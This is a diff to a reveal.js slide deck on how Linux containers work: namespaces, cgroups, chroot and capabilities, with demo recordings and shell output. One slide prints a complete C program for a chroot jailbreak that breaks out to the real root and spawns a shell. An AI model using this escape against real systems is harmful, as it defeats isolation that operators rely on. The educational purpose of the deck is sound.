@@ -14,6 +14,8 @@
 	<!-- Theme used for syntax highlighting of code -->
 	<link rel="stylesheet" href="lib/css/monokai.css">
 
+	<link rel="stylesheet" type="text/css" href="assets/asciinema/asciinema-player.css" />
+
 	<!-- Printing and PDF exports -->
 	<script>
 		var link = document.createElement('link');
@@ -29,9 +31,9 @@
 		<div class="slides">
 			<section data-markdown>
 				<textarea data-template>
-					# Containers Kernel Magic
+					# Containers on Linux
 
-					The Kernel magic behind containers
+					The Linux Kernel magic behind containers
 
 					`containers.yongwen.xyz`
 				</textarea>
@@ -56,7 +58,7 @@
 						### Containers are not panacea
 
 						- Share the same Kernel and vulnerabilities
-						- Equally vulnerable to side-channel attacks like Meltdown and Spectre
+						- Equally vulnerable to side-channel attacks like Meltdown, Spectre, and Rowhammer
 					</textarea>
 				</section>
 
@@ -70,19 +72,336 @@
 				</section>
 			</section>
 
-			<section data-markdown>
-				<textarea data-template>
-					## `containerd` "Ecoystem"
+			<section>
+				<section data-markdown>
+					<textarea data-template>
+						## [`containerd`](https://containerd.io/) "Ecoystem"
 
-					![](assets/containerd.png)
+						![](assets/containerd.png)
+
+						<aside class="notes">
+							- What started out as "Docker" has evolved into this melange of projects and
+							ecosystem as developers seek to "break up" the monolithic Docker
+
+							- Docker is now an API client for `containerd` which runs most of the underlying
+							magic that powers containers
+						</aside>
+					</textarea>
+				</section>
+
+				<section data-markdown>
+					<textarea data-template>
+						## [`runc`](https://github.com/opencontainers/runc)
+
+						- Implements the [OCI Runtime Specification](https://github.com/opencontainers/runtime-spec)
+							for Linux supporting various architectures like AMD64 and ARM
+						- Other OS have their own implementation. e.g. [`runhcs`](https://docs.microsoft.com/en-us/virtualization/windowscontainers/deploy-containers/containerd) for Windows
+					</textarea>
+				</section>
+
+				<section data-markdown>
+					<textarea data-template>
+						## Kernel Features
+
+						- Namespace
+						- cgroups
+						- Capabilities
+						- LSM
+						- Filesystem Jails
+					</textarea>
+				</section>
+			</section>
+
+			<section>
+				<section data-markdown>
+					<textarea data-template>
+						## [Namespace](http://man7.org/linux/man-pages/man7/namespaces.7.html) [[1]](https://lwn.net/Articles/531114/) [[2]](https://windsock.io/introducing-namespaces/)
+
+						Isolated view of a global resource
+
+						- pid
+						- network
+						- mount
+						- ipc
+						- uts
+						- user
+						- cgroup
+					</textarea>
+				</section>
+
+				<section data-markdown>
+					<textarea type="text/template">
+## Namespace
+
+```bash
+$ tree /proc/self/ns
+/proc/self/ns
+├── cgroup -> cgroup:[4026531835]
+├── ipc -> ipc:[4026531839]
+├── mnt -> mnt:[4026531840]
+├── net -> net:[4026532008]
+├── pid -> pid:[4026531836]
+├── pid_for_children -> pid:[4026531836]
+├── user -> user:[4026531837]
+└── uts -> uts:[4026531838]
+```
+             </textarea>
+				</section>
+
+				<section>
+					<h3><a href="http://man7.org/linux/man-pages/man7/pid_namespaces.7.html">pid</a> Namespace <a href="https://github.com/nbrownuk/Namespaces">[1]</a></h3>
+
+					<asciinema-player src="assets/asciinema/pid.cast"></asciinema-player>
 
 					<aside class="notes">
-						- What started out as "Docker" has evolved into this melange of projects and
-						ecosystem as developers seek to "break up" the monolithic Docker
-
-						- Docker is now an API client for `containerd` which runs most of the underlying
-						magic that powers containers
+						PID is in its own namespace
+						But we can still see the other PIDs
 					</aside>
+
+					<!--
+
+echo $$
+tree /proc/self/ns
+sudo ./pid -p bash
+echo $$
+tree /proc/self/ns
+TERM=xterm-256color top
+					-->
+				</section>
+
+				<section>
+					<h3>pid + <a href="http://man7.org/linux/man-pages/man7/mount_namespaces.7.html">mount</a> namespaces</h3>
+
+					<asciinema-player src="assets/asciinema/pid_mnt.cast"></asciinema-player>
+					<aside class="notes">
+					The views provided by the /proc/[pid]/mounts, /proc/[pid]/mountinfo,
+					and /proc/[pid]/mountstats files (all described in proc(5))
+					correspond to the mount namespace in which the process with the PID
+					[pid] resides.
+					</aside>
+				</section>
+
+				<section>
+					<h3><a href="http://man7.org/linux/man-pages/man7/uts_namespaces.7.html">uts namespace</a></h3>
+
+					<asciinema-player src="assets/asciinema/uts.cast"></asciinema-player>
+				</section>
+
+				<section>
+					<h3><a href="http://man7.org/linux/man-pages/man7/ipc_namespaces.7.html">IPC</a> Namespace</h3>
+					<asciinema-player src="assets/asciinema/ipc.cast"></asciinema-player>
+
+					<aside class="notes">
+					Isolates the various IPC mechanisms
+					- Pipes
+					- Shared Memory
+					- Message Queues
+					- Semaphores
+					</aside>
+				</section>
+
+				<section>
+					<h3>Network Namespace</h3>
+
+					<asciinema-player src="assets/asciinema/net.cast"></asciinema-player>
+
+					<aside class="notes">
+						Not very useful by itself. Someone else (like Docker) needs to create the appropriate
+						network devices for isolation.
+
+						More advanced use case can use a combination of iptables and other underlying network support
+						to give each container its own IP address. For example, on GKE, all containers in the pod
+						share the same network namespace and have a unique IP address.
+					</aside>
+				</section>
+
+				<section data-markdown>
+					<textarea data-template>
+						### User namespace
+
+						- tl;dr: Root user inside namespace != root user outside
+						- Problems with file owners and permissions
+						- Final defence against namespace jail escaping
+						- Not commonly used
+						- e.g. PSP requiring non-root UID instead
+					</textarea>
+				</section>
+			</section>
+
+			<section>
+				<section data-markdown>
+					<textarea data-template>
+						## Control Groups ([cgroups](https://lwn.net/Articles/604609/))
+
+						- Limits, accounts for, and isolate resources
+						- Hierarchical
+						- A process can join any combination of cgroup per subsystem
+
+```bash
+$ tree -L 1 /sys/fs/cgroup
+/sys/fs/cgroup
+├── blkio
+├── cpu -> cpu,cpuacct
+├── cpuacct -> cpu,cpuacct
+├── cpu,cpuacct
+├── cpuset
+├── devices
+├── freezer
+├── hugetlb
+├── memory
+├── net_cls -> net_cls,net_prio
+├── net_cls,net_prio
+├── net_prio -> net_cls,net_prio
+├── perf_event
+├── pids
+├── rdma
+├── systemd
+└── unified
+```
+					</textarea>
+				</section>
+
+				<section data-markdown>
+					<textarea data-template>
+### cgroups
+
+```bash
+$ cat /proc/self/cgroup
+12:rdma:/
+11:devices:/user.slice
+10:hugetlb:/
+9:net_cls,net_prio:/
+8:freezer:/
+7:memory:/user.slice/user-1000.slice/session-2.scope
+6:pids:/user.slice/user-1000.slice/session-2.scope
+5:cpuset:/
+4:blkio:/user.slice
+3:perf_event:/
+2:cpu,cpuacct:/user.slice
+1:name=systemd:/user.slice/user-1000.slice/session-2.scope
+0::/user.slice/user-1000.slice/session-2.scope
+```
+<aside class="notes">
+	Normally managed by system.d
+</aside>
+					</textarea>
+
+				</section>
+
+				<section data-markdown>
+						<textarea data-template>
+### Container cgroups
+
+```bash
+$ docker run --rm -it -m 128M ubuntu bash
+WARNING: Your kernel does not support swap limit capabilities or the cgroup is not mounted. Memory limited without swap.
+root@d1275fb6223d:/# cat /proc/self/cgroup
+12:rdma:/
+11:devices:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+10:hugetlb:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+9:net_cls,net_prio:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+8:freezer:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+7:memory:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+6:pids:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+5:cpuset:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+4:blkio:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+3:perf_event:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+2:cpu,cpuacct:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+1:name=systemd:/docker/d1275fb6223de003c2554feafe9ea44306cdec96cba0173d254e93d10f5eaf01
+0::/system.slice/containerd.service
+```
+							</textarea>
+				</section>
+
+				<section data-markdown>
+					<textarea data-template>
+						### cgroup Namespace
+
+						- Hides parent cgroup hierarchy
+						- Does not seem to be used
+					</textarea>
+				</section>
+
+				<section data-markdown>
+					<textarea data-template>
+						### cgroup v2
+
+						- Simplified Hierarchy: a process can only join one cgroup which encompasses everything
+						- Support in ecosystem ["soon"](https://medium.com/nttlabs/cgroup-v2-596d035be4d7)
+					</textarea>
+				</section>
+			</section>
+
+			<section>
+				<section data-markdown>
+					<textarea data-template>
+						## chroot
+
+						- Changes the apparent root directory
+						- Docker and other higher level container services use more advanced layering file
+						systems
+					</textarea>
+				</section>
+
+				<section data-markdown>
+					<textarea data-template>
+### chroot Jailbreak  [[src]](https://filippo.io/escaping-a-chroot-jail-slash-1/)
+```c
+#include <sys/stat.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+int main() {
+		int dir_fd, x;
+		setuid(0); // set to root user
+		mkdir(".42", 0755); // create a temp directory
+		// get descriptor to current fake root
+		dir_fd = open(".", O_RDONLY);
+		chroot(".42"); // chroot to temp directory
+		fchdir(dir_fd); // cd to previous fake root
+
+		// At this point we have escaped the jail
+
+		close(dir_fd);
+		for(x = 0; x < 1000; x++) chdir(".."); // go up up up
+		chroot(".");
+		return execl("/bin/sh", "-i", NULL); // profit?
+}
+```
+					</textarea>
+				</section>
+
+				<section>
+					<h3>chroot jailbreak</h3>
+					<asciinema-player src="assets/asciinema/chroot.cast"></asciinema-player>
+				</section>
+
+				<section data-markdown>
+					<textarea data-template>
+						## chroot Jailbreak
+
+						- Only needs `CAP_SYS_CHROOT` syscap
+					</textarea>
+				</section>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template>
+					## [capabilities](http://man7.org/linux/man-pages/man7/capabilities.7.html)
+
+					- Container processes are usually UID 0 (i.e. root)
+					- Capabilities are used to remove privileges (e.g. `CAP_SYS_CHROOT`)
+				</textarea>
+			</section>
+
+			<section data-markdown>
+				<textarea data-template>
+					## More...?
+
+					- AppArmor
+					- seLinux
+					- Seccomp
+					- Sysctl
 				</textarea>
 			</section>
 		</div>
@@ -104,6 +423,8 @@
 			]
 		});
 	</script>
+
+	<script src="assets/asciinema/asciinema-player.js"></script>
 </body>
 
 </html>
